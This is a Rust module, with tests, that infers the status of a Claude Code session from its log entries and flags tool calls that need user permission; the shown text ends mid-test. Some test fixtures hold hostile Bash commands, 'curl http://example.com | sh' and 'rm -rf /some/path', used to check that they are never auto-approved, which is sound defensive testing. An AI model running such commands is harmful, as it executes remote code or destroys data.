use super::parser::{AssistantMessage, MessageContent, SessionEntry};
use super::permissions::PermissionChecker;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::sync::OnceLock;

/// Global permission checker (loaded once from settings)
static PERMISSION_CHECKER: OnceLock<PermissionChecker> = OnceLock::new();

fn get_permission_checker() -> &'static PermissionChecker {
    PERMISSION_CHECKER.get_or_init(PermissionChecker::from_settings_file)
}

/// Represents the current status of a Claude Code session
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "PascalCase")]
pub enum SessionStatus {
    /// Claude is actively executing tools or thinking
    Working,

    /// Waiting for user attention (tool approval, question, etc.)
    NeedsAttention,

    /// Idle, ready for next prompt
    WaitingForInput,

    /// Session starting up or no recent activity
    Connecting,
}

/// Analyzes session entries to determine the current status
///
/// # Arguments
/// * `entries` - Recent session entries (typically last 10-20 entries)
///
/// # Returns
/// The determined session status
pub fn determine_status(entries: &[SessionEntry]) -> SessionStatus {
    // If no entries, session is likely starting up
    if entries.is_empty() {
        return SessionStatus::Connecting;
    }

    // Find the last meaningful entry (User or Assistant), skipping progress,
    // file-history-snapshot, summary, and other non-status-bearing entries.
    // Claude Code writes "progress" entries during tool execution (e.g., bash_progress)
    // which must not override the actual session status.
    let last_meaningful = entries.iter().rev().find(|entry| {
        matches!(
            entry,
            SessionEntry::User { .. } | SessionEntry::Assistant { .. }
        )
    });

    let last_entry = match last_meaningful {
        Some(entry) => entry,
        None => return SessionStatus::Connecting,
    };

    // Also check if there are any recent progress entries AFTER the last meaningful entry.
    // Progress entries (e.g., bash_progress) indicate active tool execution.
    let last_meaningful_idx = entries
        .iter()
        .rposition(|entry| {
            matches!(
                entry,
                SessionEntry::User { .. } | SessionEntry::Assistant { .. }
            )
        })
        .unwrap_or(0);
    let has_trailing_progress = entries[last_meaningful_idx + 1..]
        .iter()
        .any(|entry| matches!(entry, SessionEntry::Unknown));

    match last_entry {
        SessionEntry::User { base, message } => {
            // Check if this is a tool_result or an actual user prompt.
            // Tool results mean Claude is still processing.
            if message.is_tool_result {
                // This is a tool result - Claude should be generating its next response.
                // But if it's old, the session might be idle (process died, etc.).
                // 30s threshold (increased from 15s) accommodates API latency and longer operations.
                if is_entry_recent(&base.timestamp, 30) {
                    SessionStatus::Working
                } else {
                    SessionStatus::WaitingForInput
                }
            } else if is_entry_recent(&base.timestamp, 30) {
                // Recent user prompt - Claude should be responding
                SessionStatus::Working
            } else {
                // Old user prompt with no response - session is likely idle
                SessionStatus::WaitingForInput
            }
        }
        SessionEntry::Assistant { base, message } => {
            // Analyze the assistant message content
            let raw_status = analyze_assistant_message(message);

            // Check if the assistant is asking the user a question.
            // - AskUserQuestion tool: trigger immediately (no recency delay)
            // - Text ending with '?': only trigger after 20s (avoid flickering while streaming)
            if has_pending_ask_user_question(&message.content) {
                return SessionStatus::NeedsAttention;
            }
            if is_assistant_asking_question(message) && !is_entry_recent(&base.timestamp, 20) {
                return SessionStatus::NeedsAttention;
            }

            match raw_status {
                SessionStatus::Working => {
                    // "Working" from analyze_assistant_message means either:
                    // 1. Pending tool_use (auto-approved) - check for trailing progress
                    // 2. Text with no stop_reason (but stop_reason is always None in JSONL)
                    //
                    // Use recency + trailing progress to distinguish active from idle
                    let has_pending_tools = has_pending_tool_uses(&message.content);

                    if has_pending_tools {
                        // Tool is pending - check if there's active progress or recent activity.
                        // 20s threshold (increased from 10s) accommodates tool execution time.
                        if has_trailing_progress || is_entry_recent(&base.timestamp, 20) {
                            SessionStatus::Working
                        } else {
                            // Pending tool but no recent activity - likely stale
                            SessionStatus::Working
                        }
                    } else {
                        // No pending tools, just text/thinking content.
                        // Since stop_reason is always None in JSONL, we use recency:
                        // if the entry was written recently, Claude is likely still
                        // streaming or about to write more. If old, session is idle.
                        // 20s threshold (increased from 10s) accommodates streaming and thinking pauses.
                        if is_entry_recent(&base.timestamp, 20) {
                            SessionStatus::Working
                        } else {
                            SessionStatus::WaitingForInput
                        }
                    }
                }
                SessionStatus::NeedsAttention => {
                    // Permission-needing tool - return immediately, no delay
                    SessionStatus::NeedsAttention
                }
                _ => raw_status,
            }
        }
        _ => {
            // Should not reach here since we filtered for User/Assistant above
            SessionStatus::WaitingForInput
        }
    }
}

/// Checks if a timestamp is within the last N seconds
fn is_entry_recent(timestamp: &str, seconds: i64) -> bool {
    if let Ok(entry_time) = DateTime::parse_from_rfc3339(timestamp) {
        let now = Utc::now();
        let age = now.signed_duration_since(entry_time.with_timezone(&Utc));
        age.num_seconds() < seconds
    } else {
        // If we can't parse the timestamp, assume it's not recent
        false
    }
}

/// Checks if the message content has a pending AskUserQuestion tool use
fn has_pending_ask_user_question(content: &[MessageContent]) -> bool {
    let completed_ids: Vec<&str> = content
        .iter()
        .filter_map(|c| {
            if let MessageContent::ToolResult { tool_use_id, .. } = c {
                Some(tool_use_id.as_str())
            } else {
                None
            }
        })
        .collect();

    content.iter().any(|c| {
        if let MessageContent::ToolUse { id, name, .. } = c {
            name == "AskUserQuestion" && !completed_ids.contains(&id.as_str())
        } else {
            false
        }
    })
}

/// Checks if an assistant message is asking the user a question.
///
/// Detects two patterns:
/// 1. The last text block ends with a question mark (e.g., "Want me to proceed?")
/// 2. The message contains a pending `AskUserQuestion` tool use
///
/// Only triggers when the message has `stop_reason` of `end_turn` (for text questions)
/// or when `AskUserQuestion` tool is pending, indicating Claude is waiting for user input.
fn is_assistant_asking_question(message: &AssistantMessage) -> bool {
    // Pattern 1: Check for pending AskUserQuestion tool use
    let has_pending_ask = message.content.iter().any(|c| {
        if let MessageContent::ToolUse { name, id, .. } = c {
            if name == "AskUserQuestion" {
                // Check if there's a corresponding tool result
                return !message.content.iter().any(|r| {
                    matches!(r, MessageContent::ToolResult { tool_use_id, .. } if tool_use_id == id)
                });
            }
        }
        false
    });

    if has_pending_ask {
        return true;
    }

    // Pattern 2: Last text block ends with '?' and stop_reason is end_turn
    if message.stop_reason.as_deref() == Some("end_turn") {
        let last_text = message
            .content
            .iter()
            .rev()
            .find_map(|c| {
                if let MessageContent::Text { text } = c {
                    Some(text.as_str())
                } else {
                    None
                }
            });

        if let Some(text) = last_text {
            let trimmed = text.trim();
            if trimmed.ends_with('?') || trimmed.ends_with("?)") {
                return true;
            }
        }
    }

    false
}

/// Analyzes an assistant message to determine status
fn analyze_assistant_message(message: &AssistantMessage) -> SessionStatus {
    // Check if the message contains any tool uses
    let has_tool_use = message
        .content
        .iter()
        .any(|content| matches!(content, MessageContent::ToolUse { .. }));

    if has_tool_use {
        // Check if all tool uses have corresponding results
        let all_tools_completed = check_all_tools_completed(&message.content);

        if all_tools_completed {
            // All tools completed - check stop reason to determine next state
            match message.stop_reason.as_deref() {
                Some("end_turn") => SessionStatus::WaitingForInput,
                Some("tool_use") => {
                    // This shouldn't happen if tools are completed, but if it does,
                    // the message is likely still being processed
                    SessionStatus::Working
                }
                Some("max_tokens") | Some("stop_sequence") => SessionStatus::WaitingForInput,
                _ => SessionStatus::WaitingForInput,
            }
        } else {
            // Tool use present but not all completed
            // Check if pending tools are auto-approved
            if are_pending_tools_auto_approved(&message.content) {
                // All pending tools will be auto-approved, so status is Working
                SessionStatus::Working
            } else {
                // At least one pending tool needs user permission
                SessionStatus::NeedsAttention
            }
        }
    } else {
        // No tool use, just text/thinking content
        match message.stop_reason.as_deref() {
            Some("end_turn") => SessionStatus::WaitingForInput,
            Some("max_tokens") | Some("stop_sequence") => SessionStatus::WaitingForInput,
            None => {
                // Still generating if no stop reason
                SessionStatus::Working
            }
            _ => SessionStatus::WaitingForInput,
        }
    }
}

/// Checks if all pending (incomplete) tool uses are auto-approved
fn are_pending_tools_auto_approved(content: &[MessageContent]) -> bool {
    let checker = get_permission_checker();

    // Get IDs of tools that have results
    let completed_ids: Vec<&str> = content
        .iter()
        .filter_map(|c| {
            if let MessageContent::ToolResult { tool_use_id, .. } = c {
                Some(tool_use_id.as_str())
            } else {
                None
            }
        })
        .collect();

    // Check each tool use - if it's pending (no result), check if auto-approved
    for item in content {
        if let MessageContent::ToolUse { id, name, input } = item {
            // Skip if already completed
            if completed_ids.contains(&id.as_str()) {
                continue;
            }

            // This tool is pending - check if it's auto-approved
            if !checker.is_auto_approved(name, input) {
                // Found a tool that needs permission
                return false;
            }
        }
    }

    // All pending tools are auto-approved
    true
}

/// Gets the name describing why the session needs attention.
///
/// Returns one of:
/// - A tool name (e.g., "Bash", "Write") if a tool needs user permission
/// - "AskUserQuestion" if Claude is asking the user a question via tool
/// - "Question" if Claude's last text ends with a question mark
/// - None if the session doesn't need attention
pub fn get_pending_tool_name(entries: &[SessionEntry]) -> Option<String> {
    // Find the last assistant message entry
    let last_assistant = entries.iter().rev().find_map(|entry| {
        if let SessionEntry::Assistant { message, .. } = entry {
            Some(message)
        } else {
            None
        }
    })?;

    let checker = get_permission_checker();

    // Get IDs of tools that have results
    let completed_ids: Vec<&str> = last_assistant
        .content
        .iter()
        .filter_map(|c| {
            if let MessageContent::ToolResult { tool_use_id, .. } = c {
                Some(tool_use_id.as_str())
            } else {
                None
            }
        })
        .collect();

    // Find the first pending tool that needs permission or AskUserQuestion
    for item in &last_assistant.content {
        if let MessageContent::ToolUse { id, name, input } = item {
            // Skip if already completed
            if completed_ids.contains(&id.as_str()) {
                continue;
            }

            // Pending AskUserQuestion → return it directly
            if name == "AskUserQuestion" {
                return Some("AskUserQuestion".to_string());
            }

            // This tool is pending - check if it needs permission
            if !checker.is_auto_approved(name, input) {
                return Some(name.clone());
            }
        }
    }

    // Check if assistant is asking a text-based question
    if is_assistant_asking_question(last_assistant) {
        return Some("Question".to_string());
    }

    None
}

/// Checks if there are any pending (incomplete) tool uses
fn has_pending_tool_uses(content: &[MessageContent]) -> bool {
    !check_all_tools_completed(content)
}

/// Checks if all tool uses in the content have corresponding tool results
fn check_all_tools_completed(content: &[MessageContent]) -> bool {
    // Collect all tool use IDs
    let mut tool_use_ids = Vec::new();
    for item in content {
        if let MessageContent::ToolUse { id, .. } = item {
            tool_use_ids.push(id.clone());
        }
    }

    // If no tool uses, return true (nothing to check)
    if tool_use_ids.is_empty() {
        return true;
    }

    // Collect all tool result IDs
    let mut tool_result_ids = Vec::new();
    for item in content {
        if let MessageContent::ToolResult { tool_use_id, .. } = item {
            tool_result_ids.push(tool_use_id.clone());
        }
    }

    // Check if all tool use IDs have corresponding results
    for tool_id in &tool_use_ids {
        if !tool_result_ids.contains(tool_id) {
            return false;
        }
    }

    true
}

/// Determines status with additional context from multiple entries
///
/// This function looks at the last few entries to get more context about
/// the session state, which can be more accurate than just looking at the
/// last entry alone.
pub fn determine_status_with_context(entries: &[SessionEntry]) -> SessionStatus {
    if entries.is_empty() {
        return SessionStatus::Connecting;
    }

    // For minimal context, treat as connecting
    if entries.len() <= 2 {
        return SessionStatus::Connecting;
    }

    // Get the basic status from the last entry
    let basic_status = determine_status(entries);

    // If we detect Working status, but the previous entry was also an assistant
    // message with completed tools, we might actually be waiting for input
    if basic_status == SessionStatus::Working && entries.len() >= 2 {
        let last_entry = &entries[entries.len() - 1];
        let prev_entry = &entries[entries.len() - 2];

        if let (
            SessionEntry::Assistant {
                message: last_msg, ..
            },
            SessionEntry::Assistant { .. },
        ) = (last_entry, prev_entry)
        {
            // If both are assistant messages and last one has no tool use,
            // might be waiting for input
            let last_has_tools = last_msg
                .content
                .iter()
                .any(|c| matches!(c, MessageContent::ToolUse { .. }));

            if !last_has_tools && last_msg.stop_reason.is_some() {
                return SessionStatus::WaitingForInput;
            }
        }
    }

    basic_status
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::parser::{SessionEntryBase, UserMessage};

    fn create_base() -> SessionEntryBase {
        // Use current time so recency checks pass in tests
        let now = Utc::now().to_rfc3339();
        SessionEntryBase {
            uuid: "test-uuid".to_string(),
            timestamp: now,
            session_id: Some("test-session".to_string()),
            cwd: None,
            version: None,
            git_branch: None,
            parent_uuid: None,
            is_sidechain: None,
            slug: None,
        }
    }

    fn create_old_base() -> SessionEntryBase {
        // Use an old timestamp to simulate stale/idle entries
        SessionEntryBase {
            uuid: "test-uuid".to_string(),
            timestamp: "2026-01-01T12:00:00Z".to_string(),
            session_id: Some("test-session".to_string()),
            cwd: None,
            version: None,
            git_branch: None,
            parent_uuid: None,
            is_sidechain: None,
            slug: None,
        }
    }

    #[test]
    fn test_empty_entries() {
        let entries: Vec<SessionEntry> = vec![];
        assert_eq!(determine_status(&entries), SessionStatus::Connecting);
    }

    #[test]
    fn test_user_message_means_working() {
        let entries = vec![SessionEntry::User {
            base: create_base(),
            message: UserMessage {
                role: "user".to_string(),
                content: "Hello".to_string(),
                is_tool_result: false,
                images: vec![],
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::Working);
    }

    #[test]
    fn test_assistant_text_completed() {
        // Old entry with end_turn should be WaitingForInput
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Hello there!".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_assistant_generating() {
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Thinking...".to_string(),
                }],
                stop_reason: None,
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::Working);
    }

    #[test]
    fn test_tool_use_pending_auto_approved() {
        // Read is auto-approved, so pending Read should be Working
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::ToolUse {
                    id: "toolu_123".to_string(),
                    name: "Read".to_string(),
                    input: serde_json::json!({"file_path": "/test/file.txt"}),
                }],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::Working);
    }

    #[test]
    fn test_tool_use_pending_needs_permission() {
        // Bash with unknown command needs permission
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::ToolUse {
                    id: "toolu_123".to_string(),
                    name: "Bash".to_string(),
                    input: serde_json::json!({"command": "rm -rf /some/path"}),
                }],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::NeedsAttention);
    }

    #[test]
    fn test_tool_use_completed() {
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file.txt"}),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_123".to_string(),
                        content: "File content here".to_string(),
                        is_error: Some(false),
                    },
                ],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_multiple_tools_partially_completed_auto_approved() {
        // Both tools are Read (auto-approved), so even partial = Working
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file1.txt"}),
                    },
                    MessageContent::ToolUse {
                        id: "toolu_456".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file2.txt"}),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_123".to_string(),
                        content: "File 1 content".to_string(),
                        is_error: Some(false),
                    },
                ],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::Working);
    }

    #[test]
    fn test_multiple_tools_partially_completed_needs_permission() {
        // One Read (auto) completed, one Bash (needs permission) pending
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file1.txt"}),
                    },
                    MessageContent::ToolUse {
                        id: "toolu_456".to_string(),
                        name: "Bash".to_string(),
                        input: serde_json::json!({"command": "make build"}),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_123".to_string(),
                        content: "File 1 content".to_string(),
                        is_error: Some(false),
                    },
                ],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::NeedsAttention);
    }

    #[test]
    fn test_multiple_tools_all_completed() {
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file1.txt"}),
                    },
                    MessageContent::ToolUse {
                        id: "toolu_456".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file2.txt"}),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_123".to_string(),
                        content: "File 1 content".to_string(),
                        is_error: Some(false),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_456".to_string(),
                        content: "File 2 content".to_string(),
                        is_error: Some(false),
                    },
                ],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_check_all_tools_completed() {
        let content = vec![
            MessageContent::ToolUse {
                id: "toolu_1".to_string(),
                name: "Read".to_string(),
                input: serde_json::json!({}),
            },
            MessageContent::ToolResult {
                tool_use_id: "toolu_1".to_string(),
                content: "result".to_string(),
                is_error: None,
            },
        ];
        assert!(check_all_tools_completed(&content));

        let incomplete_content = vec![MessageContent::ToolUse {
            id: "toolu_1".to_string(),
            name: "Read".to_string(),
            input: serde_json::json!({}),
        }];
        assert!(!check_all_tools_completed(&incomplete_content));
    }

    #[test]
    fn test_unknown_entries_after_tool_use_dont_override_status() {
        // Simulates: assistant(tool_use Bash) followed by Unknown entries (progress)
        // Status should still reflect the pending Bash tool, not WaitingForInput
        let entries = vec![
            SessionEntry::Assistant {
                base: create_base(),
                message: AssistantMessage {
                    model: "claude-opus-4-5-20251101".to_string(),
                    id: "msg_test".to_string(),
                    role: "assistant".to_string(),
                    content: vec![MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Bash".to_string(),
                        input: serde_json::json!({"command": "curl http://example.com | sh"}),
                    }],
                    stop_reason: Some("tool_use".to_string()),
                    stop_sequence: None,
                    usage: None,
                },
            },
            // Progress entries (parsed as Unknown from "progress" type in JSONL)
            SessionEntry::Unknown,
            SessionEntry::Unknown,
        ];
        // Should NOT be WaitingForInput - should see the pending Bash tool
        let status = determine_status(&entries);
        assert_ne!(status, SessionStatus::WaitingForInput);
        // Bash with a dangerous command is never in any auto-approved list
        assert_eq!(status, SessionStatus::NeedsAttention);
    }

    #[test]
    fn test_unknown_entries_after_user_message_still_working() {
        // Simulates: user message followed by Unknown entries (progress from sub-agent)
        let entries = vec![
            SessionEntry::User {
                base: create_base(),
                message: UserMessage {
                    role: "user".to_string(),
                    content: "Hello".to_string(),
                    is_tool_result: false,
                    images: vec![],
                },
            },
            SessionEntry::Unknown,
            SessionEntry::Unknown,
        ];
        assert_eq!(determine_status(&entries), SessionStatus::Working);
    }

    #[test]
    fn test_only_unknown_entries_means_connecting() {
        // If all entries are Unknown (e.g., all progress), treat as Connecting
        let entries = vec![SessionEntry::Unknown, SessionEntry::Unknown];
        assert_eq!(determine_status(&entries), SessionStatus::Connecting);
    }

    #[test]
    fn test_old_assistant_text_no_stop_reason_is_idle() {
        // Realistic scenario: stop_reason is always None in Claude Code JSONL.
        // An old text-only assistant message with no stop_reason should be idle.
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Here's my response.".to_string(),
                }],
                stop_reason: None,
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_recent_assistant_text_no_stop_reason_is_working() {
        // Recent text-only assistant message with no stop_reason means
        // Claude is still actively streaming / generating
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Working on it...".to_string(),
                }],
                stop_reason: None,
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::Working);
    }

    #[test]
    fn test_old_user_prompt_is_idle() {
        // A user prompt from long ago with no response should be idle
        let entries = vec![SessionEntry::User {
            base: create_old_base(),
            message: UserMessage {
                role: "user".to_string(),
                content: "Hello".to_string(),
                is_tool_result: false,
                images: vec![],
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_get_pending_tool_name_needs_permission() {
        // Bash command that needs permission
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::ToolUse {
                    id: "toolu_123".to_string(),
                    name: "Bash".to_string(),
                    input: serde_json::json!({"command": "rm -rf /some/path"}),
                }],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), Some("Bash".to_string()));
    }

    #[test]
    fn test_get_pending_tool_name_auto_approved() {
        // Read is auto-approved, should return None
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::ToolUse {
                    id: "toolu_123".to_string(),
                    name: "Read".to_string(),
                    input: serde_json::json!({"file_path": "/test/file.txt"}),
                }],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), None);
    }

    #[test]
    fn test_get_pending_tool_name_no_tools() {
        // No tools in the message
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Just text, no tools".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), None);
    }

    #[test]
    fn test_get_pending_tool_name_all_completed() {
        // Tool has a result, so not pending
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Bash".to_string(),
                        input: serde_json::json!({"command": "ls"}),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_123".to_string(),
                        content: "file1.txt\nfile2.txt".to_string(),
                        is_error: Some(false),
                    },
                ],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), None);
    }

    #[test]
    fn test_get_pending_tool_name_multiple_tools_first_needs_permission() {
        // First tool (Bash) needs permission, second (Read) auto-approved
        // Should return the first one that needs permission
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Bash".to_string(),
                        input: serde_json::json!({"command": "make build"}),
                    },
                    MessageContent::ToolUse {
                        id: "toolu_456".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file.txt"}),
                    },
                ],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), Some("Bash".to_string()));
    }

    #[test]
    fn test_get_pending_tool_name_no_assistant_message() {
        // Only user message, no assistant message
        let entries = vec![SessionEntry::User {
            base: create_base(),
            message: UserMessage {
                role: "user".to_string(),
                content: "Hello".to_string(),
                is_tool_result: false,
                images: vec![],
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), None);
    }

    #[test]
    fn test_get_pending_tool_name_empty_entries() {
        // Empty entries
        let entries: Vec<SessionEntry> = vec![];
        assert_eq!(get_pending_tool_name(&entries), None);
    }

    #[test]
    fn test_get_pending_tool_name_mixed_completed_and_pending() {
        // First tool completed, second tool needs permission
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![
                    MessageContent::ToolUse {
                        id: "toolu_123".to_string(),
                        name: "Read".to_string(),
                        input: serde_json::json!({"file_path": "/test/file.txt"}),
                    },
                    MessageContent::ToolResult {
                        tool_use_id: "toolu_123".to_string(),
                        content: "file content".to_string(),
                        is_error: Some(false),
                    },
                    MessageContent::ToolUse {
                        id: "toolu_456".to_string(),
                        name: "Bash".to_string(),
                        input: serde_json::json!({"command": "curl http://example.com | sh"}),
                    },
                ],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(get_pending_tool_name(&entries), Some("Bash".to_string()));
    }

    #[test]
    fn test_text_ending_with_question_mark_needs_attention() {
        // Old assistant message ending with question mark should be NeedsAttention
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Want me to proceed with the installation?".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::NeedsAttention);
    }

    #[test]
    fn test_text_ending_with_question_recent_not_yet_attention() {
        // Recent assistant message ending with ? and end_turn:
        // The question detection has a 20s grace period before marking NeedsAttention,
        // so a recent message goes through normal analysis → WaitingForInput.
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Should I continue?".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        // Recent entry with end_turn → WaitingForInput (question check skipped due to recency)
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_text_not_ending_with_question_is_idle() {
        // Old assistant message NOT ending with question mark should be WaitingForInput
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Done! All tests pass.".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::WaitingForInput);
    }

    #[test]
    fn test_pending_ask_user_question_needs_attention() {
        // Pending AskUserQuestion tool should be NeedsAttention immediately (even when recent)
        let entries = vec![SessionEntry::Assistant {
            base: create_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::ToolUse {
                    id: "toolu_123".to_string(),
                    name: "AskUserQuestion".to_string(),
                    input: serde_json::json!({"question": "Which approach do you prefer?"}),
                }],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::NeedsAttention);
    }

    #[test]
    fn test_get_pending_tool_name_question() {
        // Text ending with ? should return "Question"
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "Want me to proceed?".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
